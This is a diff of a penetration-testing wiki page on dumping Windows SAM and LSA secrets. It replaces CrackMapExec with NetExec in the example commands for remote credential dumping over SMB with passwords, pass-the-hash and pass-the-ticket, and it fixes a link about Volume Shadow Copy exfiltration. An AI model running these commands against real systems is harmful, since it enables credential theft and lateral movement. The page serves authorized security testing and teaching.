@@ -70,7 +70,7 @@ BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATT
 ```
 
 {% hint style="info" %}
-Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](../../../../ad/movement/credentials/dumping/broken-reference/) like demonstrated for an NTDS export.
+Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](ntds.md#volume-shadow-copy-vssadmin) like demonstrated for an NTDS export.
 {% endhint %}
 {% endtab %}
 
@@ -114,21 +114,21 @@ secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -syst
 ```
 {% endtab %}
 
-{% tab title="CrackMapExec" %}
-[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos)
+{% tab title="netexec" %}
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos)
 
 ```bash
 # Remote dumping of SAM/LSA secrets
-crackmapexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa
+netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa
 
 # Remote dumping of SAM/LSA secrets (local user authentication)
-crackmapexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa
+netexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa
 
 # Remote dumping of SAM/LSA secrets (pass-the-hash)
-crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa
+netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa
 
 # Remote dumping of SAM/LSA secrets (pass-the-ticket)
-crackmapexec smb $TARGETS --kerberos --sam/--lsa
+netexec smb $TARGETS --kerberos --sam/--lsa
 ```
 {% endtab %}
 
@@ -152,7 +152,7 @@ lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system
 {% endtabs %}
 
 {% hint style="info" %}
-**Nota bene** secretsdump and crackmapexec both extract security questions, if any, from the LSA. They are json formatted, UTF-16-LE encoded, and hex encoded on top of that.
+**Nota bene** secretsdump and netexec both extract security questions, if any, from the LSA. They are json formatted, UTF-16-LE encoded, and hex encoded on top of that.
 {% endhint %}
 
 ## Resources
